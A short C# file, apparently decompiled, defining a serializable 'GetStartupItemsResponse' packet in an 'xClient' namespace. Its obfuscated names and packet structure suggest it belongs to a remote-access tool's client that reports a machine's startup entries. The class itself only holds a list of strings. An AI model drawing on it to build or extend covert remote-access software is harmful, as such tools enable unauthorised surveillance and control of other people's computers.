using System;
using System.Collections.Generic;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetStartupItemsResponse : GInterface4
{
	public List<string> StartupItems { get; set; }

	public GetStartupItemsResponse()
	{
	}

	public GetStartupItemsResponse(List<string> startupitems)
	{
		StartupItems = startupitems;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
